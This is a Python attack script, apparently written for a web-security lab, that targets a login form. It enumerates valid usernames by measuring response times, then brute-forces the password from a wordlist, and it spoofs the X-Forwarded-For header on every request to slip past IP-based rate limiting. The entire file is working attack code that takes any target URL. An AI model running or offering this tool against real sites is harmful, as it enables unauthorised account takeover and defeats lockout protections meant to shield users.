import requests  # For making HTTP requests
import time      # For measuring response time
import sys       # For exiting in case of fatal errors
import os        # For checking if files exist

# Function to generate a spoofed IP address
def spoof_ip(attempt):
    # Simulate different IPs by incrementing the last part of the IP address
    return f"200.{attempt}"

# Function to send login request and capture both status code and response time
def send_request(url, username, password, spoofed_ip):
    headers = {
        "X-Forwarded-For": spoofed_ip
    }
    
    data = {
        "username": username,
        "password": password
    }

    try:
        # Measure time just before sending request
        start_time = time.time()

        # Send the POST request to the login page
        response = requests.post(url, data=data, headers=headers)

        # Measure time after receiving response
        end_time = time.time()

        # Calculate response time
        response_time = end_time - start_time

        # Return HTTP status code and response time
        return response.status_code, response_time
    
    except requests.RequestException as e:
        # Handle network errors or issues with the request
        print(f"Error sending request: {e}")
        sys.exit(1)

# Load usernames and passwords from file, with error handling for missing/empty files
def load_list_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        sys.exit(1)
    
    try:
        with open(file_path, 'r') as file:
            lines = [line.strip() for line in file.readlines() if line.strip()]
            if not lines:
                print(f"Error: File '{file_path}' is empty.")
                sys.exit(1)
            return lines
    except IOError as e:
        print(f"Error reading file '{file_path}': {e}")
        sys.exit(1)

# Phase 1: Identify a valid username by analyzing response times
def find_valid_username(url, usernames):
    print("Starting username identification...")
    
    for attempt, username in enumerate(usernames):
        spoofed_ip = spoof_ip(attempt)
        password = "a" * 100  # Long string to increase response time
        
        # Send login request and get status code + response time
        status_code, response_time = send_request(url, username, password, spoofed_ip)
        
        # Log the attempt
        print(f"Attempt {attempt + 1}: Username='{username}', Response Time={response_time:.2f} seconds")

        # If response time is significantly higher, assume valid username
        if response_time > 2:  # Modify threshold based on target behavior
            print(f"Valid username found: {username}")
            return username

    return None

# Phase 2: Brute-force the password for the valid username
def brute_force_password(url, valid_username, passwords):
    print(f"Starting password brute-force for username: {valid_username}...")
    
    for attempt, password in enumerate(passwords):
        spoofed_ip = spoof_ip(attempt)

        status_code, response_time = send_request(url, valid_username, password, spoofed_ip)

        print(f"Attempt {attempt + 1}: Password='{password}', Status Code={status_code}, Response Time={response_time:.2f} seconds")

        if status_code == 302:  # Successful login
            print(f"Password found: {password}")
            return password

    return None

# Main execution
if __name__ == "__main__":
    # Get the URL from the user
    url = input("Enter the login URL (e.g., http://target.com/login): ").strip()
    
    if not url:
        print("Error: URL cannot be empty.")
        sys.exit(1)

    # Load usernames and passwords from files
    usernames_file = input("Enter the path to the usernames file: ").strip()
    passwords_file = input("Enter the path to the passwords file: ").strip()

    # Load usernames and passwords from files with error handling
    usernames = load_list_from_file(usernames_file)
    passwords = load_list_from_file(passwords_file)

    # Step 1: Find a valid username
    valid_username = find_valid_username(url, usernames)

    if valid_username:
        print(f"Valid username '{valid_username}' identified. Proceeding to brute-force password...")
        valid_password = brute_force_password(url, valid_username, passwords)

        if valid_password:
            print(f"Login successful! Username: '{valid_username}', Password: '{valid_password}'")
        else:
            print("Password brute-force failed. No valid password found.")
    else:
        print("No valid username found.")
